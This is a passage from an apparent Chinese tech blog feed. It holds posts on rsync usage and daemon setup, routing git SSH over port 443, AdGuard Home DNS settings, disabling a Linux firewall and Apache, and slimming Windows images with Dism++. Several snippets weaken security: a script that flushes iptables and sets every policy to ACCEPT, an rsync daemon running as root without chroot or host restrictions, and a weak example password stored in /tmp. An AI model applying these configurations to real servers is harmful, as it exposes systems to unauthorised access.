<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Debian</span></span><br><span class="line">apt update</span><br><span class="line">apt-get install rsync</span><br><span class="line"></span><br><span class="line"><span class="comment"># Red Hat</span></span><br><span class="line">yum install rsync</span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch Linux</span></span><br><span class="line">pacman -S rsync</span><br><span class="line"></span><br><span class="line"><span class="comment"># openwrt/istoreos</span></span><br><span class="line">opkg update</span><br><span class="line">opkg install rsync</span><br><span class="line">opkg install rsyncd</span><br><span class="line"></span><br><span class="line"><span class="comment">#验证安装成功</span></span><br><span class="line">rsync --version</span><br></pre></td></tr></table></figure>

<p>注意，传输的双方都必须安装 rsync。</p>
<h2 id="三、基本用法"><a href="#三、基本用法" class="headerlink" title="三、基本用法"></a>三、基本用法</h2><h3 id="3-1-r-参数"><a href="#3-1-r-参数" class="headerlink" title="3.1 -r 参数"></a>3.1 <code>-r</code> 参数</h3><p>本机使用 rsync 命令时，可以作为<code>cp</code>和<code>mv</code>命令的替代方法，将源目录同步到目标目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -r <span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>

<p>上面命令中，<code>-r</code>表示递归，即包含子目录。注意，<code>-r</code>是必须的，否则 rsync 运行不会成功。<code>source</code>目录表示源目录，<code>destination</code>表示目标目录。</p>
<p>如果有多个文件或目录需要同步，可以写成下面这样。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -r source1 source2 destination</span><br></pre></td></tr></table></figure>

<p>上面命令中，<code>source1</code>、<code>source2</code>都会被同步到<code>destination</code>目录。</p>
<h3 id="3-2-a-参数"><a href="#3-2-a-参数" class="headerlink" title="3.2 -a 参数"></a>3.2 <code>-a</code> 参数</h3><p><code>-a</code>参数可以替代<code>-r</code>，除了可以递归同步以外，还可以同步元信息（比如修改时间、权限等）。由于 rsync 默认使用文件大小和修改时间决定文件是否需要更新，所以<code>-a</code>比<code>-r</code>更有用。下面的用法才是常见的写法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -a <span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>

<p>目标目录<code>destination</code>如果不存在，rsync 会自动创建。执行上面的命令后，源目录<code>source</code>被完整地复制到了目标目录<code>destination</code>下面，即形成了<code>destination/source</code>的目录结构。</p>
<p>如果只想同步源目录<code>source</code>里面的内容到目标目录<code>destination</code>，则需要在源目录后面加上斜杠。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -a <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>上面命令执行后，<code>source</code>目录里面的内容，就都被复制到了<code>destination</code>目录里面，并不会在<code>destination</code>下面创建一个<code>source</code>子目录。</p>
<h3 id="3-3-n-参数"><a href="#3-3-n-参数" class="headerlink" title="3.3 -n 参数"></a>3.3 <code>-n</code> 参数</h3><p>如果不确定 rsync 执行后会产生什么结果，可以先用<code>-n</code>或<code>--dry-run</code>参数模拟执行的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -anv <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>上面命令中，<code>-n</code>参数模拟命令执行的结果，并不真的执行命令。<code>-v</code>参数则是将结果输出到终端，这样就可以看到哪些内容会被同步。</p>
<h3 id="3-4-delete-参数"><a href="#3-4-delete-参数" class="headerlink" title="3.4 --delete 参数"></a>3.4 <code>--delete</code> 参数</h3><p>默认情况下，rsync 只确保源目录的所有内容（明确排除的文件除外）都复制到目标目录。它不会使两个目录保持相同，并且不会删除文件。如果要使得目标目录成为源目录的镜像副本，则必须使用<code>--delete</code>参数，这将删除只存在于目标目录、不存在于源目录的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --delete <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>上面命令中，<code>--delete</code>参数会使得<code>destination</code>成为<code>source</code>的一个镜像。</p>
<h2 id="四、排除文件"><a href="#四、排除文件" class="headerlink" title="四、排除文件"></a>四、排除文件</h2><h3 id="4-1-exclude-参数"><a href="#4-1-exclude-参数" class="headerlink" title="4.1 --exclude 参数"></a>4.1 <code>--exclude</code> 参数</h3><p>有时，我们希望同步时排除某些文件或目录，这时可以用<code>--exclude</code>参数指定排除模式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --exclude=<span class="string">&#x27;*.txt&#x27;</span> <span class="built_in">source</span>/ destination</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">rsync -av --exclude <span class="string">&#x27;*.txt&#x27;</span> <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>上面命令排除了所有 TXT 文件。</p>
<p>注意，rsync 会同步以”点”开头的隐藏文件，如果要排除隐藏文件，可以这样写<code>--exclude=&quot;.*&quot;</code>。</p>
<p>如果要排除某个目录里面的所有文件，但不希望排除目录本身，可以写成下面这样。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --exclude <span class="string">&#x27;dir1/*&#x27;</span> <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>多个排除模式，可以用多个<code>--exclude</code>参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --exclude <span class="string">&#x27;file1.txt&#x27;</span> --exclude <span class="string">&#x27;dir1/*&#x27;</span> <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>多个排除模式也可以利用 Bash 的大扩号的扩展功能，只用一个<code>--exclude</code>参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --exclude=&#123;<span class="string">&#x27;file1.txt&#x27;</span>,<span class="string">&#x27;dir1/*&#x27;</span>&#125; <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>如果排除模式很多，可以将它们写入一个文件，每个模式一行，然后用<code>--exclude-from</code>参数指定这个文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --exclude-from=<span class="string">&#x27;exclude-file.txt&#x27;</span> <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<h3 id="4-2-include-参数"><a href="#4-2-include-参数" class="headerlink" title="4.2 --include 参数"></a>4.2 <code>--include</code> 参数</h3><p><code>--include</code>参数用来指定必须同步的文件模式，往往与<code>--exclude</code>结合使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av --include=<span class="string">&quot;*.txt&quot;</span> --exclude=<span class="string">&#x27;*&#x27;</span> <span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>上面命令指定同步时，排除所有文件，但是会包括 TXT 文件。</p>
<h2 id="五、远程同步"><a href="#五、远程同步" class="headerlink" title="五、远程同步"></a>五、远程同步</h2><h3 id="5-1-SSH-协议"><a href="#5-1-SSH-协议" class="headerlink" title="5.1 SSH 协议"></a>5.1 SSH 协议</h3><p>rsync 除了支持本地两个目录之间的同步，也支持远程同步。它可以将本地内容，同步到远程服务器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av <span class="built_in">source</span>/ username@remote_host:destination</span><br></pre></td></tr></table></figure>

<p>也可以将远程内容同步到本地。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av username@remote_host:<span class="built_in">source</span>/ destination</span><br></pre></td></tr></table></figure>

<p>rsync 默认使用 SSH 进行远程登录和数据传输。</p>
<p>由于早期 rsync 不使用 SSH 协议，需要用<code>-e</code>参数指定协议，后来才改的。所以，下面<code>-e ssh</code>可以省略。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av -e ssh <span class="built_in">source</span>/ user@remote_host:/destination</span><br></pre></td></tr></table></figure>

<p>但是，如果 ssh 命令有附加的参数，则必须使用<code>-e</code>参数指定所要执行的 SSH 命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -av -e <span class="string">&#x27;ssh -p 2234&#x27;</span> <span class="built_in">source</span>/ user@remote_host:/destination</span><br></pre></td></tr></table></figure>

<p>上面命令中，<code>-e</code>参数指定 SSH 使用2234端口。</p>
<h3 id="5-2-rsync-模块协议（推荐）"><a href="#5-2-rsync-模块协议（推荐）" class="headerlink" title="5.2 rsync 模块协议（推荐）"></a>5.2 rsync 模块协议（推荐）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/rsyncd.conf           <span class="comment">#编写模块服务器配置</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uid = root                      <span class="comment">#rsync进程以root用户身份运行</span></span><br><span class="line">gid = root                      <span class="comment">#rsync进程以root组身份运行</span></span><br><span class="line">use <span class="built_in">chroot</span> = no                 <span class="comment">#禁用 chroot 安全机制</span></span><br><span class="line">max connections = 4             <span class="comment">#设置允许的最大并发连接数为4</span></span><br><span class="line">pid file = /var/run/rsyncd.pid  <span class="comment">#指定rsync进程PID文件路径</span></span><br><span class="line">lock file = /var/run/rsync.lock <span class="comment">#指定rsync锁定文件的路径</span></span><br><span class="line"><span class="built_in">log</span> file = /var/log/rsyncd.log  <span class="comment">#指定rsync日志文件的路径</span></span><br><span class="line"></span><br><span class="line">[module]                     <span class="comment">#模块名称</span></span><br><span class="line">path = /path/to/your/shared/directory  <span class="comment">#需要同步的文件地址</span></span><br><span class="line">comment = My Shared Directory   <span class="comment">#模块描述</span></span><br><span class="line"><span class="built_in">read</span> only = no                  <span class="comment">#可读写</span></span><br><span class="line">list = <span class="built_in">yes</span>                      <span class="comment">#列出模组，false隐藏模组</span></span><br><span class="line"><span class="comment">#hosts allow = 192.168.1.0/24   #特定客户端ip才能访问</span></span><br></pre></td></tr></table></figure>

<p>除了使用 SSH，如果另一台服务器安装并运行了 rsync 守护程序，则也可以用<code>rsync://</code>协议（默认端口873）进行传输。具体写法是服务器与目标目录之间使用双冒号分隔<code>::</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -avz <span class="built_in">source</span>/ 192.168.122.32::module/destination</span><br><span class="line"></span><br><span class="line"><span class="comment">#rsync 协议除了使用双冒号，也可以直接用`rsync://`协议指定地址。</span></span><br><span class="line">rsync -avz <span class="built_in">source</span>/ rsync://192.168.122.32/module/destination</span><br></pre></td></tr></table></figure>

<p>注意，上面地址中的<code>module</code>并不是实际路径名，而是 rsync 守护程序指定的一个资源名，由管理员分配。</p>
<p>如果想知道 rsync 守护程序分配的所有 module 列表，可以执行下面命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync 192.168.122.32::</span><br><span class="line">或者</span><br><span class="line">rsync rsync://192.168.122.32 </span><br></pre></td></tr></table></figure>

<h2 id="六、增量备份（可选）"><a href="#六、增量备份（可选）" class="headerlink" title="六、增量备份（可选）"></a>六、增量备份（可选）</h2><p>rsync 的最大特点就是它可以完成增量备份，也就是默认只复制有变动的文件。</p>
<p>除了源目录与目标目录直接比较，rsync 还支持使用基准目录，即将源目录与基准目录之间变动的部分，同步到目标目录。</p>
<p>具体做法是，第一次同步是全量备份，所有文件在基准目录里面同步一份。以后每一次同步都是增量备份，只同步源目录与基准目录之间有变动的部分，将这部分保存在一个新的目标目录。这个新的目标目录之中，也是包含所有文件，但实际上，只有那些变动过的文件是存在于该目录，其他没有变动的文件都是指向基准目录文件的硬链接。</p>
<p><code>--link-dest</code>参数用来指定同步时的基准目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -a --delete --link-dest /compare/path /source/path /target/path</span><br></pre></td></tr></table></figure>

<p>上面命令中，<code>--link-dest</code>参数指定基准目录<code>/compare/path</code>，然后源目录<code>/source/path</code>跟基准目录进行比较，找出变动的文件，将它们拷贝到目标目录<code>/target/path</code>。那些没变动的文件则会生成硬链接。这个命令的第一次备份时是全量备份，后面就都是增量备份了。</p>
<p>下面是一个脚本示例，备份用户的主目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A script to perform incremental backups using rsync</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -o errexit</span><br><span class="line"><span class="built_in">set</span> -o nounset</span><br><span class="line"><span class="built_in">set</span> -o pipefail</span><br><span class="line"></span><br><span class="line"><span class="built_in">readonly</span> SOURCE_DIR=<span class="string">&quot;<span class="variable">$&#123;HOME&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> BACKUP_DIR=<span class="string">&quot;/mnt/data/backups&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> DATETIME=<span class="string">&quot;<span class="subst">$(date &#x27;+%Y-%m-%d_%H:%M:%S&#x27;)</span>&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> BACKUP_PATH=<span class="string">&quot;<span class="variable">$&#123;BACKUP_DIR&#125;</span>/<span class="variable">$&#123;DATETIME&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> LATEST_LINK=<span class="string">&quot;<span class="variable">$&#123;BACKUP_DIR&#125;</span>/latest&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;BACKUP_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">rsync -av --delete \</span><br><span class="line">  <span class="string">&quot;<span class="variable">$&#123;SOURCE_DIR&#125;</span>/&quot;</span> \</span><br><span class="line">  --link-dest <span class="string">&quot;<span class="variable">$&#123;LATEST_LINK&#125;</span>&quot;</span> \</span><br><span class="line">  --exclude=<span class="string">&quot;.cache&quot;</span> \</span><br><span class="line">  <span class="string">&quot;<span class="variable">$&#123;BACKUP_PATH&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;<span class="variable">$&#123;LATEST_LINK&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">ln</span> -s <span class="string">&quot;<span class="variable">$&#123;BACKUP_PATH&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;LATEST_LINK&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面脚本中，每一次同步都会生成一个新目录<code>$&#123;BACKUP_DIR&#125;/$&#123;DATETIME&#125;</code>，并将软链接<code>$&#123;BACKUP_DIR&#125;/latest</code>指向这个目录。下一次备份时，就将<code>$&#123;BACKUP_DIR&#125;/latest</code>作为基准目录，生成新的备份目录。最后，再将软链接<code>$&#123;BACKUP_DIR&#125;/latest</code>指向新的备份目录。</p>
<h2 id="七、配置项（配置详解）"><a href="#七、配置项（配置详解）" class="headerlink" title="七、配置项（配置详解）"></a>七、配置项（配置详解）</h2><p><code>-a</code>、<code>--archive</code>参数表示存档模式，保存所有的元数据，比如修改时间（modification time）、权限、所有者等，并且软链接也会同步过去。</p>
<p><code>--append</code>参数指定文件接着上次中断的地方，继续传输。</p>
<p><code>--append-verify</code>参数跟<code>--append</code>参数类似，但会对传输完成后的文件进行一次校验。如果校验失败，将重新发送整个文件。</p>
<p><code>-b</code>、<code>--backup</code>参数指定在删除或更新目标目录已经存在的文件时，将该文件更名后进行备份，默认行为是删除。更名规则是添加由<code>--suffix</code>参数指定的文件后缀名，默认是<code>~</code>。</p>
<p><code>--backup-dir</code>参数指定文件备份时存放的目录，比如<code>--backup-dir=/path/to/backups</code>。</p>
<p><code>--bwlimit</code>参数指定带宽限制，默认单位是 KB&#x2F;s，比如<code>--bwlimit=100</code>。</p>
<p><code>-c</code>、<code>--checksum</code>参数改变<code>rsync</code>的校验方式。默认情况下，rsync 只检查文件的大小和最后修改日期是否发生变化，如果发生变化，就重新传输；使用这个参数以后，则通过判断文件内容的校验和，决定是否重新传输。</p>
<p><code>--delete</code>参数删除只存在于目标目录、不存在于源目标的文件，即保证目标目录是源目标的镜像。</p>
<p><code>-e</code>参数指定使用 SSH 协议传输数据。</p>
<p><code>--exclude</code>参数指定排除不进行同步的文件，比如<code>--exclude=&quot;*.iso&quot;</code>。</p>
<p><code>--exclude-from</code>参数指定一个本地文件，里面是需要排除的文件模式，每个模式一行。</p>
<p><code>--existing</code>、<code>--ignore-non-existing</code>参数表示不同步目标目录中不存在的文件和目录。</p>
<p><code>-h</code>参数表示以人类可读的格式输出。</p>
<p><code>-h</code>、<code>--help</code>参数返回帮助信息。</p>
<p><code>-i</code>参数表示输出源目录与目标目录之间文件差异的详细情况。</p>
<p><code>--ignore-existing</code>参数表示只要该文件在目标目录中已经存在，就跳过去，不再同步这些文件。</p>
<p><code>--include</code>参数指定同步时要包括的文件，一般与<code>--exclude</code>结合使用。</p>
<p><code>--link-dest</code>参数指定增量备份的基准目录。</p>
<p><code>-m</code>参数指定不同步空目录。</p>
<p><code>--max-size</code>参数设置传输的最大文件的大小限制，比如不超过200KB（<code>--max-size=&#39;200k&#39;</code>）。</p>
<p><code>--min-size</code>参数设置传输的最小文件的大小限制，比如不小于10KB（<code>--min-size=10k</code>）。</p>
<p><code>-n</code>参数或<code>--dry-run</code>参数模拟将要执行的操作，而并不真的执行。配合<code>-v</code>参数使用，可以看到哪些内容会被同步过去。</p>
<p><code>-P</code>参数是<code>--progress</code>和<code>--partial</code>这两个参数的结合。</p>
<p><code>--partial</code>参数允许恢复中断的传输。不使用该参数时，<code>rsync</code>会删除传输到一半被打断的文件；使用该参数后，传输到一半的文件也会同步到目标目录，下次同步时再恢复中断的传输。一般需要与<code>--append</code>或<code>--append-verify</code>配合使用。</p>
<p><code>--partial-dir</code>参数指定将传输到一半的文件保存到一个临时目录，比如<code>--partial-dir=.rsync-partial</code>。一般需要与<code>--append</code>或<code>--append-verify</code>配合使用。</p>
<p><code>--progress</code>参数表示显示进展。</p>
<p><code>-r</code>参数表示递归，即包含子目录。</p>
<p><code>--remove-source-files</code>参数表示传输成功后，删除发送方的文件。</p>
<p><code>--size-only</code>参数表示只同步大小有变化的文件，不考虑文件修改时间的差异。</p>
<p><code>--suffix</code>参数指定文件名备份时，对文件名添加的后缀，默认是<code>~</code>。</p>
<p><code>-u</code>、<code>--update</code>参数表示同步时跳过目标目录中修改时间更新的文件，即不同步这些有更新的时间戳的文件。</p>
<p><code>-v</code>参数表示输出细节。<code>-vv</code>表示输出更详细的信息，<code>-vvv</code>表示输出最详细的信息。</p>
<p><code>--version</code>参数返回 rsync 的版本。</p>
<p><code>-z</code>参数指定同步时压缩数据。</p>
<h2 id="八、免密码同步（用于自动脚本）"><a href="#八、免密码同步（用于自动脚本）" class="headerlink" title="八、免密码同步（用于自动脚本）"></a>八、免密码同步（用于自动脚本）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将密码写到文件，再通过 --password-file 指定该文件，注：该文件的权限必须是 600</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;111111&quot;</span> &gt; /tmp/secrets.file</span><br><span class="line"><span class="built_in">chmod</span> 600 /tmp/secrets.file</span><br><span class="line">rsync -avzP --delete --password-file=/tmp/secrets.file sate@172.18.50.125::125to110 /tmp/sync/</span><br></pre></td></tr></table></figure>

<p>给大家推荐配置教程： </p>
<p>Rsync 配置与使用——SateZheng （简书） <a href="https://www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqa2dnWkNiYlh5NVVvaDd3YW04WEViMC1vWHR3d3xBQ3Jtc0tsS3l5NzNUSlgzd1NsNjk2UmN6X0NSMU9vRnBKWXg2X2xMZG8zS2Rkcy1VVjJUU1dzUkFCZnFwRHlvMVZsMDFLUlhydl9GdTVvVU8wTGhsbGVmOW1aUTFPdU1COFEzaEFjdWlCbTFVY09JbVZaYUFlaw&q=https://www.jianshu.com/p/bd3ae9d8069c">https://www.jianshu.com/p/bd3ae9d8069c</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>解决git push本地推送22端口连接超时，改为443端口</title>
    <url>/posts/37f634a6/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>之前使用 Git 推送本地仓库至远程仓库时没问题，今天突然出现了这个错误，使用了“黑科技”之后仍然还会出现这个错误。（以前也遇到过，但都是网络问题，自己就好了）</p>
<h2 id="检查连接"><a href="#检查连接" class="headerlink" title="检查连接"></a>检查连接</h2><ol>
<li>首先输入以下命令检查SSH是否能够连接成功（ssh后面有空格）</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>发现报错：端口连接超时。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh: connect to host github.com port 22: Connection timed out</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>在C盘——用户——你的主机名文件夹中找到 .ssh 文件夹；（此前配置SSH时会生成该文件夹）<br>在 .ssh 文件夹中新建文件 config.txt ，输入以下内容，将 xxxxqq.com 更改为你的邮箱，并保存。 </p>
<p>最后，去掉 .txt 后缀</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User xxxxqq.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure>

<p>再次执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>会出现以下提示，输入 <strong>yes</strong> 回车即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The authenticity of host <span class="string">&#x27;[ssh.github.com]:443 ([192.30.255.123]:443)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:xxx.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[ssh.github.com]:443,[192.30.255.123]:443<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br></pre></td></tr></table></figure>

<p>再次执行<code>ssh -T git@github.com</code>，发现验证通过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Hi Clare! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>接下来可以正常上传代码</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>adguard home的简单设置</title>
    <url>/posts/5a1e786e/</url>
    <content><![CDATA[<ul>
<li>Adguard Home常规用法DNS神器AdGuard Home最简单设置，网页秒开！秒解析、去广告、防污染的adguardhome安装设置教程！实现家里所有设备过滤广告，实现国内外流量精准分流#一瓶奶油Adguard Home常规用法</li>
</ul>
<p>1、重要功能解析</p>
<ul>
<li><p>dnsmasq</p>
<ul>
<li>在OpenWrt中，dnsmasq是一个轻量级的DNS转发器和DHCP服务器，通常用于提供DNS解析和DHCP服务。</li>
</ul>
</li>
<li><p>作为dnsmasq的上游服务器</p>
<ul>
<li>这种方式会保留dnsmasq的本地DNS解析功能。</li>
<li>dnsmasq处理所有本地的DNS请求，然后将未缓存的请求转发给AdGuard Home。</li>
<li>这种方式的逻辑是：收到请后，dnsmasq会先尝试从其缓存中查找DNS请求的答案。如果请求的答案存在于dnsmasq的缓存中，则会直接返回给客户端，不会将请求转发给AdGuard Home。如果请求的答案不在dnsmasq的缓存中，则会将请求转发给AdGuard Home。</li>
</ul>
</li>
<li><p>重定向53端口到AdGuardHome</p>
<ul>
<li>通过防火墙或路由规则，将所有发往53端口的DNS请求重定向到AdGuard Home的端口。dnsmasq仍然在运行，但其处理的DNS请求被重定向给AdGuard Home。</li>
<li>这种方式可能保持dnsmasq的某些功能（例如DHCP服务）继续运行，但DNS请求本身由AdGuard Home处理。</li>
</ul>
</li>
<li><p>使用53端口替换dnsmasg</p>
<ul>
<li>停止dnsmasq的DNS服务，使AdGuard Home直接监听和处理53端口上的DNS请求。这通常需要修改dnsmasq的配置或停用其DNS服务功能。</li>
<li>dnsmasq不再处理任何DNS请求。所有DNS相关的功能完全由AdGuard Home接管。</li>
</ul>
</li>
</ul>
<p>2、设置——DNS设置</p>
<ul>
<li><p>DNS汇总：【<a href="https://toolb.cn/publicdns">点击进入</a>】</p>
</li>
<li><p>上游DNS服务器</p>
<ul>
<li>上游DNS服务器是AdGuard Home在处理客户端的DNS请求时，用来向外部获取DNS解析结果的服务器。上游DNS服务器可以是公共DNS服务器（如阿里DNS、腾讯DNS、Google DNS、Cloudflare DNS等）或你信任的其他DNS服务器。</li>
</ul>
</li>
<li><p>Bootstrap DNS服务器</p>
<ul>
<li>Bootstrap DNS服务器用于解析上游DNS服务器的域名。在使用DoH或DoT等加密DNS协议时，需要先解析上游DNS服务器的域名才能建立加密连接，这就是Bootstrap DNS服务器的作用。</li>
</ul>
</li>
<li><p>高级配置可参考官方文档：【<a href="https://github.com/AdguardTeam/AdGuardHome/wiki/Configuration#upstreams">点击进入</a>】</p>
</li>
</ul>
<p>3、拦截规则</p>
<ul>
<li><p>开源项目1（规则收集）：【<a href="https://github.com/217heidai/adblockfilters">点击进入</a>】</p>
</li>
<li><p>AdGuard 过滤器：【<a href="https://adguard.com/kb/zh-CN/general/ad-filtering/adguard-filters/">点击进入</a>】</p>
</li>
<li><p>开源项目2（规则收集）：【<a href="https://github.com/BlueSkyXN/AdGuardHomeRules">点击进入</a>】</p>
</li>
</ul>
<p>4、测试验证</p>
<ul>
<li>windows清除DNS缓存：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipconfig /flushdnsCopy</span><br></pre></td></tr></table></figure>

<ul>
<li>OpenWrt系统清除DNS缓存<ul>
<li>输入以下代码或者重启OpenWrt</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service dnsmasq restartCopy</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>adguard</category>
      </categories>
      <tags>
        <tag>adguard</tag>
      </tags>
  </entry>
  <entry>
    <title>关闭debian/ubuntu防火墙，禁用apache web服务命令</title>
    <url>/posts/7baa7181/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#禁用 ufw 防火墙</span></span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置iptables规则</span></span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">netfilter-persistent save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断 apachectl 是否存在，如果检测到 Apache，则停止 apache2 服务，禁用 apache2 服务</span></span><br><span class="line"><span class="keyword">if</span> [[ -n $(apachectl -v 2&gt;/dev/null) ]]; <span class="keyword">then</span></span><br><span class="line">service apache2 stop</span><br><span class="line">systemctl <span class="built_in">disable</span> apache2</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>dism++精简优化windows安装包</title>
    <url>/posts/71cd8afc/</url>
    <content><![CDATA[<p>准备工作</p>
<ol>
<li><a href="https://github.com/Chuyu-Team/Dism-Multi-language/releases">Dism++</a></li>
<li>Windows原版系统镜像（任何版本皆可）</li>
</ol>
<p>第一步 提取所需版本映像</p>
<p>把准备好的系统镜像，鼠标这里以Windows11为例，利用解压软件，解压到文件夹；运行Dism，通过菜单栏，文件-打开映像文件，编辑映像文件窗口，点击浏览，添加我们解压好的，系统安装wim文件,路径在sources文件夹下，名为install，打开映像后，选中我们需要的系统版本，接着点击导出映像，保存路径随意，名字建议还是保持原来的名字，点击保存开始导出映像。此操作的目的，剔除不用的系统版本，以减少镜像体积。</p>
<p>第二步 挂载提取的映像</p>
<p>Dism主界面，文件-挂载映像，挂载映像界面，分别点击浏览，添加我们上一步提取的映像，以及设置挂载路径，最后点击确认，等待映像挂载完成，过程可能需要一段时间，耐心等待！映像挂载好后，单击打开会话，Dism便会加载当前系统映像菜单了</p>
<p>第三步 删除Windows内置应用</p>
<p>Dism启动，会默认挂载当前系统，所以我们操作的时候要谨慎，确保选中我们提取映像的系统，进行操作！点击常用工具下Appx管理，右侧窗口显示的都是预装应用，不知道都是什么不要紧，我会做一个对照表放在博客里，选中需要删除的应用，点击删除，就把该应用在映像里删除了！根据你自己的需求，依次删除不需要的应用即可！此操作，可很大程度上，减少系统镜像的体积，系统安装使用后，也可以减少对系统资源的占用！</p>
